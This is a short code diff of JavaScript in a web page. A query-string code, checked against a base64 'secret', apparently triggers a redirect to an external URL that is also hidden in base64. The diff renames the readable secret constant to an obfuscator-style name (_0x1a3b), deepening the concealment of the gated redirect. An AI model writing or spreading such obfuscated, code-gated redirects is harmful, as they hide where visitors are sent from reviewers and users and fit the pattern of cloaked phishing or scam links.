@@ -92,14 +92,14 @@
         }
 
         const _0x1a2b = 'aHR0cDovL3NvYy5zcnBnLmxpZmU='; 
-        const BASE64_SECRET_CODE = 'c3RhcnRnYW1l';
+        const _0x1a3b = 'c3RhcnRnYW1l';
 
         const REDIRECT_URL = decodeBase64(_0x1a2b); 
 
         function logAndRedirectIfValid() {
             const encodedCode = getQueryParameter('code');
             const decodedCode = decodeBase64(encodedCode);        
-            const decodedSecretCode = decodeBase64(BASE64_SECRET_CODE);
+            const decodedSecretCode = decodeBase64(_0x1a3b);
       
             if (decodedCode === decodedSecretCode) {
                 document.getElementById('top-message').textContent = 'O';
